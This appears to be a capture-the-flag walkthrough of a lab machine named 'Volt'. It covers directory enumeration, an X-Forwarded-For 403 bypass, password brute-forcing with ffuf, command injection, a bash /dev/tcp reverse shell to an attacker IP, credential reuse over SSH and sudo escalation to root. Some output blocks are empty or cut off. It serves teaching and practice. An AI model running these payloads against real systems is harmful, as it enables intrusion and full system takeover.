# 🌐 Web Enumeration

Open port **80** in a browser.

<img width="1918" height="783" alt="Screenshot_2026-08-15_09_03_24" src="https://github.com/user-attachments/assets/6da61404-5fd6-4222-8674-bd1cb1923983" />

The website is an electronics store containing several products, categories, login functionality, and registration functionality.

Next, enumerate the available directories using **Gobuster**.

```bash
gobuster dir -u http://192.168.1.49/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt
```

The most interesting findings are:

- `/admin`
- `/secret`

The `/secret` directory returns a **403 Forbidden** response.

---

# 🔓 403 Forbidden Bypass

Using Burp Suite, intercept the request to `/secret` and add the following HTTP header:

```http
X-Forwarded-For: 127.0.0.1
```

<img width="1539" height="650" alt="Screenshot_2026-08-15_09_12_42" src="https://github.com/user-attachments/assets/a7cdbd9f-0466-4c6f-804c-b716244aabaf" />

This successfully bypasses the 403 restriction and provides access to the **Volt - Internal Staff Panel**.

The panel contains the following flag:

```text
FLAG: CS{403_byp4ss_x_forwarded_for}
```

The page also indicates that staff tools are available through the `/admin` panel.

---

# 🔐 Admin Panel

We already discovered the `/admin` directory during directory enumeration.

Navigating to `/admin` displays an administrator login panel.

<img width="1918" height="784" alt="Screenshot_2026-08-15_09_20_02" src="https://github.com/user-attachments/assets/3b1776fa-f9b7-4bdf-9d85-d81a02d4b821" />

Let's brute-force the password for the `admin` user using **FFUF**.

```bash
ffuf -w /usr/share/wordlists/rockyou.txt \
-u http://192.168.1.49/admin \
-X POST \
-d "username=admin&password=FUZZ" \
-H "Content-Type: application/x-www-form-urlencoded" \
-mc 200
```

## Result

```text
$ ffuf -w /usr/share/wordlists/rockyou.txt -u http://192.168.1.49/admin -X POST -d "username=admin&password=FUZZ" -H "content-Type: application/x-www-form-urlencoded" -mc 200

```

We successfully recovered the administrator credentials.

| Username | Password |
|----------|----------|
| admin | chocolate3 |

Using these credentials, we can successfully access the admin panel.

# 💉 Command Injection

Inside the admin panel, there is a **System Diagnostics** feature that allows us to enter an IP address to check connectivity.

When a local IP address is entered, the application returns a response.

<img width="1918" height="699" alt="Screenshot_2026-08-15_09_24_44" src="https://github.com/user-attachments/assets/d6fe8b89-1ae7-4cc1-a911-f0835523d277" />

Since the functionality appears to execute a system command, we test the input for command injection.

Use:

```text
;id
```

The application returns:

<img width="1918" height="652" alt="Screenshot_2026-08-15_09_29_36" src="https://github.com/user-attachments/assets/4e8db994-67ea-4e52-aa8e-5082fefabca7" />


This confirms that the application is vulnerable to **command injection** and that commands are being executed as the `www-data` user.

---

# 🐚 Reverse Shell

Start a Netcat listener on the attacker machine.

```bash
nc -lnvp 443
```

Then enter the following payload into the vulnerable input field:

```bash
;bash -c "bash -i > /dev/tcp/192.168.1.2/443 0>&1"
```

The reverse shell is successfully received.

```text
$ nc -lnvp 443                                     
listening on [any] 443 ...
connect to [192.168.1.2] from (UNKNOWN) [192.168.1.49] 56270
id 
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

We now have access as the `www-data` user.

---

# 🖥 Shell Upgrade

Before continuing with privilege escalation, upgrade the reverse shell to a fully interactive TTY.

```bash
script /dev/null -c bash
```

Press:

```text
Ctrl + Z
```

Then execute:

```bash
stty raw -echo; fg
```

```bash
reset xterm
```

```bash
export TERM=xterm
```

```bash
export BASH=bash
```

The reverse shell is now upgraded to an interactive TTY.

---

# 🔑 Credential Discovery

The shell is located in the `/opt/volt/` directory.

An interesting file named `config.py` is present.

Read the file:

```bash
cat config.py
```

## Result

```text
www-data@volt:/opt/volt$ cat config.py 
# Volt store - database configuration
# TODO: move secrets to environment variables before production rollout
DB_HOST = "127.0.0.1"
DB_PORT = 3306
DB_NAME = "volt_store"
DB_USER = "batusai"
DB_PASS = "V0lt_db_S3cr3t_2026"
www-data@volt:/opt/volt$ 
```

The configuration file exposes credentials for the `batusai` user.

```text
Username: batusai
Password: V0lt_db_S3cr3t_2026
```

Since SSH is available on port 22, try these credentials against SSH.

---

# 🔐 SSH Access as batusai

```bash
ssh batusai@192.168.1.49
```

After entering the discovered password, we successfully obtain an SSH session.

Verify the current user:

```bash
id
```

## Result

```text
$ ssh batusai@192.168.1.49
The authenticity of host '192.168.1.49 (192.168.1.49)' can't be established.

We now have access as the `batusai` user.

# 🏁 User Flag

The user flag is located in the home directory.

```bash
cat user.txt
```

## Result

```text

```

---

# 🔍 Privilege Escalation

Let's check the sudo permissions available to `batusai`.

```bash
sudo -l
```

## Result

```text
batusai@volt:~$ sudo -l

[sudo] password for batusai: 
Matching Defaults entries for batusai on volt:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User batusai may run the following commands on volt:
    (ALL : ALL) ALL
```

The `batusai` user has unrestricted sudo privileges and can execute commands as any user.

We can therefore switch to the root user.

```bash
sudo su
```
Enter the Password.

Verify the current privileges:

```bash
id
```

## Result

```text
root@volt:~# id
uid=0(root) gid=0(root) groups=0(root)
root@volt:~# cat /root/root.txt 
```

We have successfully escalated to **root**.

---

# 🏁 Root Flag

Read the root flag.

```bash
cat /root/root.txt
```

## Result

```text
root@volt:~# cat /root/root.txt

# 🚀 Key Takeaways

- Improper trust in the `X-Forwarded-For` header can allow attackers to bypass IP-based access restrictions.
- Administrative interfaces should not rely on weak or easily guessable passwords.
- User-controlled input used directly in system commands can lead to command injection and remote code execution.
- Sensitive credentials should never be hard-coded inside application configuration files.
- Database credentials found in application files should not automatically be reusable for SSH authentication.
- Sudo permissions should follow the principle of least privilege.
- Granting a user unrestricted `(ALL : ALL) ALL` sudo access effectively provides full root access.
